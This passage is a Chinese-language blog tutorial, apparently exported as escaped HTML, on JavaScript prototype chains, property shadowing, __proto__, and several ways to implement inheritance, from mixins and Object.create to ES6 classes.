使用混入方式实现继承</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">mixin</span> (<span class=\"params\">sourceObj, targetObj</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> k <span class=\"keyword\">in</span> sourceObj) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!targetObj[k]) &#123;</span><br><span class=\"line\">            targetObj[k] = sourceObj[k];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> targetObj;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> Person = &#123;</span><br><span class=\"line\">    name: <span class=\"string\">&#x27;nobody&#x27;</span>,</span><br><span class=\"line\">    showName () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> stu = mixin(Person, &#123;</span><br><span class=\"line\">    name: <span class=\"string\">&#x27;xxb&#x27;</span>,</span><br><span class=\"line\">    age: <span class=\"number\">24</span>,</span><br><span class=\"line\">    showAge () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.age);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">stu.showName();</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"5-2-使用对象委托实现继承\"><a href=\"#5-2-使用对象委托实现继承\" class=\"headerlink\" title=\"5.2 使用对象委托实现继承\"></a>5.2 使用对象委托实现继承</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> Person = &#123;</span><br><span class=\"line\">    init (name) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    showName () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> Student = <span class=\"built_in\">Object</span>.create(Person);</span><br><span class=\"line\"></span><br><span class=\"line\">Student.init = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">name, age</span>) </span>&#123;</span><br><span class=\"line\">    Person.init.call(<span class=\"built_in\">this</span>, name);</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">Student.showAge = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.age);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> stu = <span class=\"built_in\">Object</span>.create(Student);</span><br><span class=\"line\">stu.init(<span class=\"string\">&#x27;xxb&#x27;</span>, <span class=\"number\">24</span>);</span><br><span class=\"line\">stu.showName();</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// `Object.create()` 会创建一个新对象并把它关联到指定的对象就可以充分发挥 [[Prototype]] 机制的作用（委托），</span></span><br><span class=\"line\"><span class=\"comment\">// 并且避免不必要的麻烦（如使用 `new` 的构造函数调用会生成 `.prototype` 和 `.constructor` 引用）。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// `Object.create() `没有其他副作用，ES6添加了辅助函数 `Object.setPrototypeOf()` ，用以实现同样的功能</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"5-3-使用原型链继承\"><a href=\"#5-3-使用原型链继承\" class=\"headerlink\" title=\"5.3 使用原型链继承\"></a>5.3 使用原型链继承</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Person</span> (<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Person.prototype.showName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.name);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Student</span> (<span class=\"params\">name, age</span>) </span>&#123;</span><br><span class=\"line\">    Person.call(<span class=\"built_in\">this</span>, name);</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Student.prototype = <span class=\"built_in\">Object</span>.create(Person.prototype);</span><br><span class=\"line\">Student.prototype.constructor = Student;</span><br><span class=\"line\">Student.prototype.showAge = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.age);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> stu = <span class=\"keyword\">new</span> Student(<span class=\"string\">&#x27;xxb&#x27;</span>, <span class=\"number\">24</span>);</span><br><span class=\"line\">stu.showName();</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 如果使用 `Student.prototype = Person.prototype` 并不会创建一个关联到 `Student.prototype` 的新对象，</span></span><br><span class=\"line\"><span class=\"comment\">// 它只是让 `Student.prototype` 直接引用 `Person.prototype` 对象。</span></span><br><span class=\"line\"><span class=\"comment\">// 因此当执行类似 `Student.prototype.show = ... ` 的赋值语句时会直接修改 `Person.prototype` 对象本身。</span></span><br><span class=\"line\"><span class=\"comment\">// 显然这不是想要的结果，否则根本不需要 `Student` 对象，直接使用 `Person` 就行了。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 如果使用 `Student.prototype = new Person()` 的确会创建一个关联到 `Student.prototype` 的新对象。</span></span><br><span class=\"line\"><span class=\"comment\">// 但是它使用了 `Person()` 的“构造函数调用”，如果函数 `Person` 有一些副作用（比如给 this 添加数据属性、修改状态、注册到其他对象等）的话，就会影响到 `Student()` 的“后代”</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"5-4-使用-class-实现继承\"><a href=\"#5-4-使用-class-实现继承\" class=\"headerlink\" title=\"5.4 使用 class 实现继承\"></a>5.4 使用 class 实现继承</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 使用 es6 的 `class` 实现继承</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Person</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"title\">constructor</span> (<span class=\"params\">name</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    showName () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Student</span> <span class=\"keyword\">extends</span> <span class=\"title\">Person</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"title\">constructor</span> (<span class=\"params\">name, age</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(name);</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    showAge () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.age);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> stu = <span class=\"keyword\">new</span> Student(<span class=\"string\">&#x27;xxb&#x27;</span>, <span class=\"number\">24</span>);</span><br><span class=\"line\">stu.showAge();</span><br></pre></td></tr></table></figure>\n\n<p><strong>class 的优点：</strong></p>\n<ol>\n<li>不需要引用 <code>.prototype</code> 对象；</li>\n<li>不需要通过 <code>Object.create()</code> 来替换 <code>.prototype</code> 对象，也不需要设置 <code>.__proto__</code> 或者 <code>Object.setPrototypeOf()</code> 来指定原型链；</li>\n<li>可以通过 <code>super()</code> 来实现相对多态，这样任何方法都可以引用原型链上层的同名方法。</li>\n<li><code>class</code> 字面语法不能声明属性（只能声明方法），避免原型链末端的“实例”可能会意外地获取 其他地方的属性；</li>\n<li>可以通过 <code>extends</code> 很自然地扩展对象（子）类型，甚至是内置的对象（子）类型。</li>\n</ol>\n<p><strong>class 的缺点：</strong></p>\n<ol>\n<li>class 基本上只是现有 <code>[[Prototype]]</code> 委托机制的一种语法糖。即 class 并不会像传统面向类的语言一样在声明时静态复制所有行为。如果无意修改或者替换了父“类”中的一个方法，那子“类”和所有实例都会受到影响，因为它们在定义时并没有进行复制，只是使用基于 <code>[[Prototype]]</code> 的实时委托。</li>\n<li>用 class 定义看上去不能被修改（静态），实际上依然可以被修改（动态）</li>\n<li>不能定义属性，只能往 <code>prototype</code> 上添加，但这样违背了 <code>class</code> 语法的本意，在实现中暴露了 <code>.prototype</code></li>\n<li>出于性能考虑， <code>super</code> 并不像 <code>this</code> 一样是晚绑定（动态绑定）的，它会在创建时静态绑定。</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// `super` 的静态绑定</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">P</span> </span>&#123;</span><br><span class=\"line\">    foo () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;P.foo&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">C</span> <span class=\"keyword\">extends</span> <span class=\"title\">P</span> </span>&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> c1 = <span class=\"keyword\">new</span> C();</span><br><span class=\"line\">c1.foo(); <span class=\"comment\">// &quot;P.foo&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> D = &#123;</span><br><span class=\"line\">    foo: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log( <span class=\"string\">&quot;D.foo&quot;</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> E = &#123;</span><br><span class=\"line\">    foo: C.prototype.foo</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.setPrototypeOf(E, D); <span class=\"comment\">// 把 E 委托到 D</span></span><br><span class=\"line\">E.foo(); <span class=\"comment\">// &quot;P.foo&quot;</span></span><br></pre></td></tr></table></figure>\n\n\n<p><strong>相关方法：</strong></p>\n<ul>\n<li><code>Object.create()</code>：创建一个对象并把这个对象的 <code>[[Prototype]]</code> 关联到指定的对象</li>\n<li><code>Object.setPrototypeOf()</code>：设置一个指定的对象的原型 ( 即内部<code>[[Prototype]]</code>属性）到另一个对象或 <code>null</code></li>\n<li><code>Object.getPrototypeOf()</code>：返回指定对象的原型（即内部 <code>[[Prototype]]</code> 属性的值）</li>\n<li><code>Object.defineProperty()</code>：在一个对象上定义一个新属性，或者修改一个对象的现有属性</li>\n<li><code>Object.prototype.hasOwnproperty()</code>：返回一个布尔值，指示对象是否具有指定的属性作为自身（不继承）属性</li>\n<li><code>Object.prototype.isPrototypeOf()</code>：测试一个对象是否存在于另一个对象的原型链上，与 <code>instanceof</code> 作用类似</li>\n<li><code>fon ... in ...</code>：以任意顺序遍历一个对象的可枚举属性（包括原型链上的属性，主要用于 Object 对象）</li>\n<li><code>fon ... of ...</code>：在可迭代对象(包括 <code>Array</code>, <code>Map</code>, <code>Set</code>, <code>String</code>, <code>arguments</code> 对象等)上创建一个迭代循环，遍历每个属性值</li>\n</ul>\n<p>相关文章<br><a href=\"https://github.com/ljianshu/Blog/issues/20\">JavaScript 继承</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"原型链与继承\"><a href=\"#原型链与继承\" class=\"headerlink\" title=\"原型链与继承\"></a>原型链与继承</h1><h3 id=\"1、原型链\"><a href=\"#1、原型链\" class=\"headerlink\" title=\"1、原型链\"></a>1、原型链</h3><p>在面向类的语言中，类可以被复制（或实例化）多次，实例化（或者继承）一个类就意味着“把类的 行为复制到物理对象中”，对于每一个新实例来说都会重复这个过程。</p>\n<p>在 JavaScript 中，并没有类似的复制机制。Javascript 中不能创建一个类的多个实例，只能创建多个对象，它们的 <code>[[Prototype]]</code> 关联的是同一个对象，这样一个对象就可以通过委托访问另一个对象的属性和函数。</p>\n<p>JavaScript 中父类和子类的关系只存在于两者构造函数对应的 <code>.prototype</code> 对象中，它们的构造函数之间并不存在直接联系</p>\n<p>JavaScript 中的函数无法真正地复制，只能复制对共享函数对象的引用，JavaScript 对象有一个特殊的 <code>[[Prototype]]</code> 内置属性，其实就是对于其他对象的引用。几乎所有的对象在创建时 <code>[[Prototype]]</code> 属性都会被赋予一个非空的值。</p>\n<p>函数本身并不是构造函数，然而，当在普通的函数调用前面加上 <code>new</code> 关键字之后，就会把这个函数调用变成一个“构造函数 调用”。实际上， <code>new</code> 会劫持所有普通函数并用构造对象的形式来调用它。在 JavaScript 中对于“构造函数”最准确的解释是，所有带 <code>new</code> 的函数调用。</p>\n<p><code>new Foo()</code> 这个函数调用实际上并没有直接创建关联，这个关联只是一个意外的副作用（新创建的对象添加了 <code>__proto__</code> 属性）， <code>new Foo()</code> 只是间接完成了目标：一个关联到其他对象的新对象。更直接的方式是使用 <code>Object.create(...)</code>。</p>\n<p>JavaScript 的 <code>[[Prototype]]</code> 机制本质上就是行为委托机制：<code>[[Prototype]]</code> 存在于对象中的一个内部链接，它会引用其他对象。通常来说，这个链接的作用是：如果在对象上没有找到需要的属性或者方法引用，引擎就会继续在 <code>[[Prototype]]</code> 关联的对象上进行查找。同理，如果在后者中也没有找到需要的引用就会继续查找它的 <code>[[Prototype]</code>] ，以此类推。这一系列对象的链接被称为“原型链”。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Foo</span>(<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Foo.prototype.myName = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.name;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"keyword\">new</span> Foo( <span class=\"string\">&quot;a&quot;</span> );</span><br><span class=\"line\"><span class=\"keyword\">var</span> b = <span class=\"keyword\">new</span> Foo( <span class=\"string\">&quot;b&quot;</span> );</span><br><span class=\"line\">a.myName(); <span class=\"comment\">// &quot;a&quot;</span></span><br><span class=\"line\">b.myName(); <span class=\"comment\">// &quot;b&quot;</span></span><br><span class=\"line\">a.constructor === Foo <span class=\"comment\">// true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 看起来创建 `a` 和 `b` 时会把 `Foo.prototype` 对象复制到这两个对象中，然而事实并不是这样，</span></span><br><span class=\"line\"><span class=\"comment\">// 在创建的过程中， `a` 和 `b` 的内部 [[Prototype]] 都会关联到 `Foo.prototype` 上。</span></span><br><span class=\"line\"><span class=\"comment\">// 当 `a` 和 `b` 中无法找到 `myName` 时，它会在 `Foo.prototype` 上找到。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 看起来 `a.constructor === Foo` 为真意味着 `a` 确实有一个指向 `Foo` 的 `.constructor` 属性，</span></span><br><span class=\"line\"><span class=\"comment\">// 但是事实不是这样，实际上， `.constructor` 引用同样被委托给了 `Foo.prototype` ，而`Foo.prototype.constructor` 默认指向 `Foo`</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2、属性遍历\"><a href=\"#2、属性遍历\" class=\"headerlink\" title=\"2、属性遍历\"></a>2、属性遍历</h3><p>使用 <code>for...in</code> 遍历对象时原理和查找 <code>[[Prototype]]</code> 链类似，任何可以通过原型链访问到且 <code>enumerable: true</code> 的属性都会被枚举。使用 <code>in</code> 操作符检查属性在对象中是否存在时，也会查找对象的整条原型链（无论属性是否可枚举）</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    name: <span class=\"string\">&#x27;xxb&#x27;</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.defineProperty(obj, <span class=\"string\">&#x27;age&#x27;</span>, &#123;</span><br><span class=\"line\">    age: <span class=\"number\">24</span>,</span><br><span class=\"line\">    enumerable: <span class=\"literal\">false</span></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> key <span class=\"keyword\">in</span> obj) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(key);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;age&#x27;</span> <span class=\"keyword\">in</span> obj);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;toString&#x27;</span> <span class=\"keyword\">in</span> obj);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3、属性设置与屏蔽\"><a href=\"#3、属性设置与屏蔽\" class=\"headerlink\" title=\"3、属性设置与屏蔽\"></a>3、属性设置与屏蔽</h3><p>在于原型链上层时 obj.foo = “bar” 会出现的三种情况。</p>\n<ol>\n<li>如果在 [[Prototype]] 链上层存在名为 foo 的普通数据访问属性并且 writable: true ，那就会直接在 obj 中添加一个名为 foo 的新属性，它是屏蔽属性。</li>\n<li>如果在 [[Prototype]] 链上层存在 foo ，但 writable:false，那么无法修改已有属性或者在 obj 上创建屏蔽属性。如果运行在严格模式下，代码会抛出一个错误。否则，这条赋值语句会被忽略。总之，不会发生屏蔽。</li>\n<li>如果在 [[Prototype]] 链上层存在 foo 并且它是一个 setter，那就一定会调用这个 setter。 foo 不会被添加到obj ，也不会重新定义 foo 这个 setter。</li>\n</ol>\n<blockquote>\n<p>[[Prototype]] 链上层的只读属性会阻止 [[Prototype]] 链下层隐式创建（屏蔽）同名属性。这样做主要是为了模拟类属性的继承，比如父类的属性只读级别，则子类的属性应该不高于只读级别。</p>\n</blockquote>\n<blockquote>\n<p>解决第2、3种情况可使用 Object.defineProperty() , 而不是使用 = 赋值</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 情形1 生成屏蔽属性</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> parent = &#123;</span><br><span class=\"line\">    name: <span class=\"string\">&#x27;aaaa&#x27;</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> son = <span class=\"built_in\">Object</span>.create(parent);</span><br><span class=\"line\">son.name = <span class=\"string\">&#x27;bbbb&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(son.name);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 情形2 赋值时报错</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> parent = &#123;&#125;;</span><br><span class=\"line\"><span class=\"built_in\">Object</span>.defineProperty(parent, <span class=\"string\">&#x27;name&#x27;</span>, &#123;</span><br><span class=\"line\">    value: <span class=\"string\">&#x27;aaa&#x27;</span>,</span><br><span class=\"line\">    writable: <span class=\"literal\">false</span></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> son = <span class=\"built_in\">Object</span>.create(parent);</span><br><span class=\"line\">son.name = <span class=\"string\">&#x27;bbbb&#x27;</span>;  <span class=\"comment\">// TypeError: Cannot assign to read only property &#x27;name&#x27; of object &#x27;#&lt;Object&gt;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 情形3 赋值失败并执行 `set()`</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> parent = &#123;&#125;;</span><br><span class=\"line\"><span class=\"built_in\">Object</span>.defineProperty(parent, <span class=\"string\">&#x27;name&#x27;</span>, &#123;</span><br><span class=\"line\">    set () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;set&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> son = <span class=\"built_in\">Object</span>.create(parent);</span><br><span class=\"line\">son.name = <span class=\"string\">&#x27;bbbb&#x27;</span>;  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(son.name);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ----- output -----</span></span><br><span class=\"line\"><span class=\"comment\">// set</span></span><br><span class=\"line\"><span class=\"comment\">// undefined</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"4、proto-属性\"><a href=\"#4、proto-属性\" class=\"headerlink\" title=\"4、proto 属性\"></a>4、<strong>proto</strong> 属性</h3><p>浏览器支持一种非标准的方法来访问内部 <code>[[Prototype]]</code> 属性， <code>.__proto__</code> 的实现大致如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Object</span>.defineProperty(<span class=\"built_in\">Object</span>.prototype, <span class=\"string\">&quot;__proto__&quot;</span>, &#123;</span><br><span class=\"line\">    get: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">Object</span>.getPrototypeOf( <span class=\"built_in\">this</span> );</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    set: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">o</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">Object</span>.setPrototypeOf(<span class=\"built_in\">this</span>, o);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> o;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>可使用 <code>Object.getPrototypeOf()</code>、<code>Object.setPrototypeOf()</code> 替代</p>\n<h3 id=\"5、实现继承的几种方式\"><a 